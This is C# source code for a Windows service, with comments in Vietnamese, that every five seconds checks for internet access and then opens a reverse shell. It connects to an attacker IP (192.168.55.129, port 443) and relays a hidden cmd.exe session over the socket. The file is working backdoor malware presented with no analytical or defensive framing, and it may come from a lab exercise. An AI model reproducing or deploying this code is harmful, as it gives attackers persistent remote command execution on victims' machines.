using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Runtime.InteropServices;
using System.Net.Sockets;

namespace KDH1
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer();
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is start at " + DateTime.Now);     // thông báo thời gian bật service
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; 
            timer.Enabled = true;
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);

        }
       
        public static bool CheckInternet()     // kiểm tra kết nối internet = cách truy cập thử vào đường đẫn đã cung cấp
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch { return false; }
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)    // hiển thị thông báo nếu kết nối thành công or thất bại
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            if (CheckInternet() == true)
            {
                WriteToFile("Internet : OK");
                ReverseShell();
            }
            else
            {
                WriteToFile("Internet : NO");
            }
        }

        private void SetOnAttacker()
        {
            ReverseShell();
        }

        static StreamWriter streamWriter;
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void ReverseShell()     // chức năng Reverse Shell ở đây máy attacker có ip 192.168.55.129 ở port 443
        {
            var handle = GetConsoleWindow();

            try
            {
                using (TcpClient client = new TcpClient(hostname: "192.168.55.129", port:443))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder stringBuilder = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(OutputOfData);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                stringBuilder.Append(reader.ReadLine());
                                p.StandardInput.WriteLine(stringBuilder);
                                stringBuilder.Remove(0, stringBuilder.Length);
                            }
                        }
                   


                    }



                }    
            } 
            catch (Exception ex) {  }
        }

        private static void OutputOfData(object sender, DataReceivedEventArgs e)
        {
            StringBuilder stringBuilder_1 = new StringBuilder();

            if (!String.IsNullOrEmpty(e.Data))

            {

                try

                {

                    stringBuilder_1.Append(e.Data);

                    streamWriter.WriteLine(stringBuilder_1);

                    streamWriter.Flush();

                }

                catch { }

            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
           DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }

}
